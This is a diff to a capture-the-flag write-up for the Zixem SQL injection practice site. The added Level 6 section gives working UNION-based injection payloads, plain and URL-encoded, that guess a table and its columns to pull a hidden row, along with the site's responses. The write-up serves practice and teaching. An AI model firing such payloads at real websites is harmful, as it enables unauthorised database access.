@@ -1,6 +1,6 @@
 # Rules!
 - Use only **UNION** BASED!
-- Your mission is to select only the **version()** & **user()**.
+- Your mission is to select only the **version()** & **user()** (Exception: **Level 6**).
 - **Have Fun** (:
 
 # Reference Table:
@@ -13,6 +13,7 @@
 - [Level 7](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-7)
 - [Level 8](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-8)
 - [Level 9](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-9)
+- [Level 10](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-10)
 
 ===========================================================================================================  
 
@@ -184,7 +185,7 @@ for i in range (0, 999999):
         break
 ~~~  
 => Pass found: 1337
-> root@Blue3:.../Zixem# py sqli-level5.py
+> root@Blue3:.../Zixem# py sqli-level5.py  
 > ...
 > - Wrong Pass : 1334
 > - Wrong Pass : 1335
@@ -194,6 +195,71 @@ for i in range (0, 999999):
 ##### Result: #####  
 [http://www.zixem.altervista.org/SQLi/login_do.php?pass=1337](http://www.zixem.altervista.org/SQLi/login_do.php?pass=1337)
 ![Level 5 Result](./lvl5-result.png)  
+
+**Bazinga!**  
+###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
+
+===========================================================================================================  
+
+## [Level 6](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#level-6)
+Start:  
+[http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10](http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10)  
+> Hello im teaching hacking for money, want details?
+>
+> - Serial number of teacher:  10
+> - Teacher: ........................ZiXeM
+> - Age:..............17
+> - Price per 1 leeson: .....................50
+>
+> Blind challenge
+> Task: Get the details of the teacher that his serial\id is 11.
+> The answer should look like that: http://i.imgur.com/AyZ7uYV.png
+> And not like that: http://i.imgur.com/RBkHPIN.png
+>
+> I repeat: in this specific challenge - You're NOT supposed to pull the version\db name. THIS IS BLIND SQL INJECTION
+> You're supposed to pull information out of a table just by guessing the table name & its columns
+> (*note: using information_schema db is not allowed*)...
+
+=> Test with prev Payload:  
+***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4--`  
+`http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4--`
+> - Serial number of teacher:  1
+> - Teacher: ........................2
+> - Age:..............3
+> - Price per 1 leeson: .....................4
+
+=> Ok let's go guessing job:  
+***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4 FROM teacher--`  
+`http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4%20FROM%20teacher--`
+> Table 'my_zixem.teacher' doesn't exist
+
+=> Typo?
+***PAYLOAD***: `10 AND 1=2 UNION SELECT 1,2,3,4 FROM teachers--`  
+`http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%201,2,3,4%20FROM%20teachers--`
+> - Serial number of teacher:  1
+> - Teacher: ........................2
+> - Age:..............3
+> - Price per 1 leeson: .....................4
+
+=> As we expected. Now guessing until we can grab all value of id=10:  
+***PAYLOAD***: `10 AND 1=2 UNION SELECT id,teachers,teacher_age,price FROM teachers WHERE id=10--`  
+`http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%20id,teachers,teacher_age,price%20FROM%20teachers%20WHERE%20id=10--`
+> Unknown column 'teachers' in 'field list'
+
+***PAYLOAD***: `10 AND 1=2 UNION SELECT id,teacher,teacher_age,price FROM teachers WHERE id=10--`  
+`http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%20id,teacher,teacher_age,price%20FROM%20teachers%20WHERE%20id=10--`
+> - Serial number of teacher:  1
+> - Teacher: ........................2
+> - Age:..............3
+> - Price per 1 leeson: .....................4
+
+***PAYLOAD***: `10 AND 1=2 UNION SELECT id,teacher,teacher_age,price FROM teachers WHERE id=11--`  
+##### Result: #####  
+`http://www.zixem.altervista.org/SQLi/blind_lvl6.php?serial=10%20AND%201=2%20UNION%20SELECT%20id,teacher,teacher_age,price%20FROM%20teachers%20WHERE%20id=11--`
+> - **Serial number of teacher:**  11
+> - **Teacher:** ........................Nice One!
+> - **Age:**..............You are pro blinder
+> - **Price per 1 leeson:** .....................Congratz
 
 **Bazinga!**  
 ###### END - Back to [Reference Tables](https://github.com/eblue3/CTF/blob/master/Zixem/SQLi.md#reference-table) ######
